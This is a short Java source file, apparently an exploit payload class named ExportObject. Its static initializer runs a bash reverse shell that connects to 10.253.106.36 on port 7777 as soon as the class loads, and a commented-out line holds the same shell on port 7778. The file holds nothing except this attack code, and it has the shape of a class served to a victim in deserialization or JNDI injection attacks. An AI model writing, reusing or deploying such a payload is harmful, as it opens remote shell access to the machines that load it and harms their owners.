package tmp;

import java.io.*;

/**
 * @author by Administrator on 2021/7/2.
 */
public class ExportObject {
    static
    {
        try {
            // Runtime.getRuntime().exec("bash -i >& /dev/tcp/10.253.106.36/7778 0>&1");
            Runtime.getRuntime().exec("/bin/bash -i >& /dev/tcp/10.253.106.36/7777 0>&1");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] argv) throws IOException, InterruptedException {
        ExportObject e = new ExportObject();
    }
}